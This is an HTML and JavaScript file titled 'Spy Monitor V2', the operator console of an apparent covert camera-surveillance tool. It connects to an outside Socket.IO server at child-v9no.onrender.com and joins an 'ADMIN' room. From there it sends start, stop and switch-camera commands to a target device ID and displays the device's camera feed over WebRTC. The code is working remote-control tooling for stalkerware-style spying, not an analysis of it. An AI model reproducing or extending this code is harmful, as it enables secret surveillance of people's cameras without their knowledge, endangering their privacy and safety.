<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Monitor V2 - Final Stable</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
    <style>
        /* CSS vahi rakhi hai jo aapke working code mein thi */
        body { margin: 0; padding: 0; background-color: #121212; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .phone-frame { position: relative; width: 100%; height: 100%; max-width: 480px; background: #000; display: flex; flex-direction: column; overflow: hidden; border: 2px solid #333; }
        
        /* Video Area */
        .video-container { flex-grow: 1; position: relative; background: #000; display: flex; align-items: center; justify-content: center; }
        video { width: 100%; height: 100%; object-fit: contain; background-color: #000; }

        .status-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; z-index: 5; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #00a8ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 10px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* Top Bar */
        .top-bar { padding: 10px 20px; background: rgba(0,0,0,0.8); display: flex; justify-content: space-between; align-items: center; z-index: 10; }
        .status-badge { background: #ff4444; padding: 5px 12px; border-radius: 15px; font-size: 11px; font-weight: bold; }
        .status-badge.online { background: #00C851; color: white; }

        /* Controls */
        .controls { padding: 20px; background: #1a1a1a; display: flex; justify-content: space-around; align-items: center; gap: 10px; }
        .btn { border: none; border-radius: 30px; font-weight: bold; cursor: pointer; transition: 0.2s; color: white; padding: 12px 20px; }
        .btn-start { background: #00C851; flex: 2; }
        .btn-stop { background: #ff4444; flex: 2; }
        .btn-switch { background: #33b5e5; flex: 1; border-radius: 50%; width: 50px; height: 50px; padding: 0; }

        #login-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        input { padding: 12px; border-radius: 8px; border: 1px solid #333; background: #222; color: white; text-align: center; margin-bottom: 15px; width: 70%; }
    </style>
</head>
<body>

    <div class="phone-frame">
        <div id="login-overlay">
            <h2>Spy Monitor</h2>
            <input type="text" id="targetId" placeholder="Enter Device ID">
            <button class="btn btn-start" style="width:70%" onclick="saveAndConnect()">CONNECT</button>
        </div>

        <div class="top-bar">
            <span id="status" class="status-badge">Offline</span>
            <span id="id-label" style="font-size: 10px; color: #555;">ID: --</span>
        </div>

        <div class="video-container">
            <div id="loader" class="status-overlay" style="display: none;">
                <div class="spinner"></div>
                <span style="font-size:12px; color:#aaa;">Connecting to Camera...</span>
            </div>
            <video id="remoteVideo" autoplay playsinline muted></video>
        </div>

        <div class="controls">
            <button class="btn btn-start" onclick="handleStream('start')">‚ñ∂ START</button>
            <button class="btn btn-switch" onclick="switchCamera()">üîÑ</button>
            <button class="btn btn-stop" onclick="handleStream('stop')">‚èπ STOP</button>
        </div>
    </div>

    <script>
        const SOCKET_URL = "https://child-v9no.onrender.com"; 
        let socket, peerConnection, targetDeviceId = "";
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        window.onload = () => {
            const savedId = localStorage.getItem("savedDeviceId");
            if (savedId) document.getElementById("targetId").value = savedId;
        };

        function saveAndConnect() {
            targetDeviceId = document.getElementById("targetId").value.trim();
            if (!targetDeviceId) return alert("Enter Device ID!");
            localStorage.setItem("savedDeviceId", targetDeviceId);
            document.getElementById("id-label").innerText = "ID: " + targetDeviceId;
            document.getElementById("login-overlay").style.display = 'none';
            initSocket();
        }

        function initSocket() {
            if (socket) socket.disconnect();
            socket = io(SOCKET_URL);

            socket.on("connect", () => {
                updateStatus("System Ready", false);
                socket.emit("join-room", "ADMIN");
            });

            socket.on("offer", async (data) => {
                console.log("üì° Offer Received");
                document.getElementById("loader").style.display = 'none';
                createPeerConnection();
                try {
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(data));
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);
                    socket.emit("answer", { target: targetDeviceId, type: "answer", sdp: answer.sdp });
                } catch (e) { console.error(e); }
            });

            socket.on("candidate", async (data) => {
                if (peerConnection) {
                    try { await peerConnection.addIceCandidate(new RTCIceCandidate(data)); } 
                    catch (e) { console.error(e); }
                }
            });
        }

        // --- Start/Stop Logic ---
        function handleStream(action) {
            if (!socket || !socket.connected) return alert("Socket not connected!");

            if (action === 'start') {
                document.getElementById("loader").style.display = 'block';
                updateStatus("Starting Camera...", false);
                socket.emit('send-command', { targetId: targetDeviceId, command: "start_video" });
            } 
            else if (action === 'stop') {
                updateStatus("Stopping...", false);
                socket.emit('send-command', { targetId: targetDeviceId, command: "stop_video" });
                
                // Clean UI & WebRTC
                const video = document.getElementById("remoteVideo");
                video.srcObject = null;
                if (peerConnection) {
                    peerConnection.close();
                    peerConnection = null;
                }
                document.getElementById("loader").style.display = 'none';
                updateStatus("Stopped", false);
            }
        }

        function createPeerConnection() {
            if (peerConnection) peerConnection.close();
            peerConnection = new RTCPeerConnection(config);

            // Aapki working track logic
            peerConnection.ontrack = (event) => {
                const video = document.getElementById("remoteVideo");
                if (event.streams && event.streams[0]) {
                    video.srcObject = event.streams[0];
                } else {
                    if (!video.srcObject) video.srcObject = new MediaStream([event.track]);
                    else video.srcObject.addTrack(event.track);
                }
                updateStatus("LIVE", true);
            };

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit("candidate", {
                        target: targetDeviceId,
                        type: "candidate",
                        candidate: event.candidate.candidate,
                        sdpMid: event.candidate.sdpMid,
                        sdpMLineIndex: event.candidate.sdpMLineIndex
                    });
                }
            };
        }

        function switchCamera() {
            if(socket) socket.emit("switch-camera", { target: targetDeviceId });
        }

        function updateStatus(text, isOnline) {
            const el = document.getElementById("status");
            el.innerText = text;
            el.className = isOnline ? "status-badge online" : "status-badge";
        }
    </script>
</body>
</html>
